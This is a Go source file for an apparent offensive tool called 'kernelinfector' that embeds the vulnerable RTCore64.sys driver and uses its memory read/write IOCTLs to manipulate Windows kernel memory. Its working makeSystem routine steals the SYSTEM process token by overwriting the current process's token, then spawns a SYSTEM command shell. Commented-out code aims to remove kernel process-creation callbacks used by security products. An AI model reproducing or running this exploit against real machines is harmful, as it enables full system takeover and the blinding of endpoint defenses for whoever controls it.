package main

// https://github.com/br-sn/CheekyBlinder - multiple code snippets were re-used here
//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed resources/NtoskrnlOffsets.csv
var ntoskrnlOffsets string

//go:embed resources/RTCore64.sys
var binfile []byte

type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	HANDLE  uintptr
	BYTE    byte
)
type SECURITY_ATTRIBUTES struct {
	Length             uint32
	SecurityDescriptor unsafe.Pointer
	InheritHandle      uint32 // bool value
}

//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
//sys LoadLibraryW(lpLibFileName string) (handle uintptr, err error) = kernel32.LoadLibraryW
//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr, err error) = kernel32.GetProcAddress
//sys FreeLibrary(hLibModule uintptr) (ret bool) = kernel32.FreeLibrary
//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
//sys CreateFile(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *SECURITY_ATTRIBUTES, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile uintptr) (handle uintptr, err error) = kernel32.CreateFile
//sys CloseHandle(hObject HANDLE) (ret bool) = kernel32.CloseHandle
//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret int,err error) = advapi32.RegGetValueW

//OpenSCManager
//OpenService
//CreateService
//StartService
//CloseServiceHandle

/*
from CheekyBlinder
type Offsets struct {
	Process  DWORD64
	Image    DWORD64
	Thread   DWORD64
	Registry DWORD64
}
*/

type Offsets struct {
	UniqueProcessIdOffset    DWORD64
	ActiveProcessLinksOffset DWORD64
	TokenOffset              DWORD64
	SignatureLevelOffset     DWORD64
}

type Rtcore64MemoryRead struct {
	Pad0     [8]byte
	Address  DWORD64
	Pad1     [8]byte
	ReadSize DWORD
	Value    DWORD
	Pad3     [16]byte
}

const (
	RTCORE64_MEMORY_READ_CODE  uint32 = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE uint32 = 0x8000204c
	INVALID_HANDLE_VALUE       HANDLE = ^HANDLE(0)
)

/*
from CheekyBlinder
func getVersionOffsets() Offsets {
	winver := w32.RegGetString(w32.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)
	switch winver {
	case "1909":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	case "2004":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	default:
		fmt.Println("[!] Version Offsets Not Found!")
		return Offsets{0, 0, 0, 0}
	}
} */

func RegGetString(hKey int, subKey string, value string) string {
	var ERROR_SUCCESS = 0
	var RRF_RT_REG_SZ uint32 = 0x00000002
	var bufLen uint32
	RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, 0, &bufLen)
	if bufLen == 0 {
		return ""
	}
	buf := make([]uint16, bufLen)
	ret, _ := RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, uintptr(unsafe.Pointer(&buf[0])), &bufLen)
	if ret != ERROR_SUCCESS {
		return ""
	}
	return syscall.UTF16ToString(buf)
}

func getVersionOffsets() Offsets {
	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)
	switch winver {
	case "1607":
		return Offsets{0x02e8, 0x02f0, 0x0358, 0x06c8}
	case "1803":
	case "1809":
		return Offsets{0x02e0, 0x02e8, 0x0358, 0x06c8}
	case "1903":
	case "1909":
		return Offsets{0x02e8, 0x02f0, 0x0360, 0x06f8}
	case "2004":
	case "2009":
		return Offsets{0x0440, 0x0448, 0x04b8, 0x0878}
	default:
		fmt.Println("[!] Version Offsets Not Found!")
		//os.Exit(-1)
		return Offsets{0, 0, 0, 0}
	}
	return Offsets{0, 0, 0, 0}
}

func getDriverHandle() HANDLE {
	device, _ := CreateFile("\\\\.\\RTCore64", windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if HANDLE(device) == INVALID_HANDLE_VALUE {
		//need error response
		fmt.Println("[!] Unable to obtain a handle to the device object")
		return HANDLE(device)
	} else {
		fmt.Printf("[+] Device object handle obtained: %x", device)
		return HANDLE(device)
	}
}

func findkrnlbase() DWORD64 {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
		return drivers[0]
	}
	//need error response
	return drivers[0]
}
func getFunctionAddress(fnc string) DWORD64 {
	ntoskrnlbaseaddress := findkrnlbase()
	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
	address := ntoskrnlbaseaddress + offset
	FreeLibrary(ntoskrnl)
	fmt.Println(address)
	return address
}

func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	memRead.Value = val
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_WRITE_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
}

func writeMemoryDWORD64(device HANDLE, adr DWORD64, val DWORD64) {
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func readMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64) DWORD {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
	return memRead.Value
}
func readMemoryDWORD(device HANDLE, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 4, adr))
}

func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
}

func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
	r := int(e - s)
	for i := 0; i < r; i++ {
		ct := readMemoryDWORD64(device, s+DWORD64(i))
		if ct == p {
			return s + DWORD64(i)
		}
	}
	return 0
}

/*
from CheekyBlinder
func findProcessCallbackRoutine(r string) {
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsSetCreateProcessNotifyRoutine")
	addr2 := getFunctionAddress("IoCreateDriver")
	// paddr := patternSearch(device, addr1, addr2, offsets.Process)
	// offset := readMemoryDWORD(device, paddr-0x0c)

} */

/*
func serviceInstall(sname string, dname string, binPath string, stype string) {
	hSc, err := w32.OpenSCManager("", "ServicesActive", w32.SC_MANAGER_CONNECT|w32.SC_MANAGER_CREATE_SERVICE)
	if err == nil {
		hs, err := w32.OpenService(hSc, sname, w32.SERVICE_START)
		if err == nil {
			fmt.Printf("[+] %s service already registered\n", sname)
		} else {
			hS = w32. (hSC, serviceName, displayName, READ_CONTROL|WRITE_DAC|SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)

		}

	}

	//w32.OpenSCManager()
} */

func makeSystem() {
	cpid := DWORD64(os.Getpid())
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsInitialSystemProcess")
	addr2 := readMemoryDWORD64(device, addr1)
	fmt.Printf("[*] PsInitialSystemProcess address: %x\n", addr2)

	//get system process token
	token := readMemoryDWORD64(device, addr2+offsets.TokenOffset) &^ 15
	fmt.Printf("[*] System process token: %x\n", token)

	processHead := addr2 + offsets.ActiveProcessLinksOffset
	currentProcessAddress := processHead
	for {
		processAddress := currentProcessAddress - offsets.ActiveProcessLinksOffset
		uniqueProcessId := readMemoryDWORD64(device, processAddress+offsets.UniqueProcessIdOffset)
		if uniqueProcessId == cpid {
			break
		}
		currentProcessAddress = readMemoryDWORD64(device, processAddress+offsets.ActiveProcessLinksOffset)
		if currentProcessAddress == processHead {
			break
		}
	}
	currentProcessAddress -= offsets.ActiveProcessLinksOffset
	fmt.Printf("[*] Current process address: %x\n", currentProcessAddress)

	currentProcessFastToken := readMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset)
	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
	currentProcessToken := currentProcessFastToken &^ 15
	fmt.Printf("[*] Current process token: %x\n", currentProcessToken)
	fmt.Println("[*] Stealing System process token ...")
	writeMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset, currentProcessTokenReferenceCounter|token)
	CloseHandle(device)

	fmt.Println("[*] Spawning new shell ...")
	cmd := exec.Command("c:\\windows\\system32\\cmd.exe")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}

func main() {
	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)

	if len(os.Args) < 2 {
		fmt.Println(usage)
	} else if os.Args[1] == "/proc" {
		//findProcessCallbackRoutine("")
	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
		//r := os.Args[2]
		//findProcessCallbackRoutine(r)
	} else if os.Args[1] == "/systemcmd" {
		makeSystem()
	} else {
		fmt.Println(usage)
	}
}
